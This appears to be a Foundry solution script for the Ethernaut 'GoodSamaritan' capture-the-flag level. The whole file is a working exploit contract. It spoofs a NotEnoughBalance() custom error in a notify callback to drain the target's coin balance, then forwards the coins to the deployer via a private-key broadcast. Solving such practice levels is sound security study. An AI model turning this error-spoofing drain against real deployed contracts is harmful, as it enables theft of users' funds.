
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GoodSamaritan.sol";

contract GoodSamaritanAttack {
    // Throw custom error NotEnoughBalance() so that the GoodSamaritan contract sends its remaining balance

    error NotEnoughBalance();

    constructor(GoodSamaritan _goodSamaritan, Coin _coin) {
        _goodSamaritan.requestDonation();
        require(_coin.balances(address(_goodSamaritan)) == 0);
        _coin.transfer(msg.sender, _coin.balances(address(this)));
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
contract GoodSamaritanSolution is Script {

    GoodSamaritan goodSamaritan = GoodSamaritan(0x7d983A1Fc19C9639b87C4021Cf470B8C38f8250F);
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GoodSamaritanAttack(goodSamaritan, goodSamaritan.coin());
        vm.stopBroadcast();
    }
}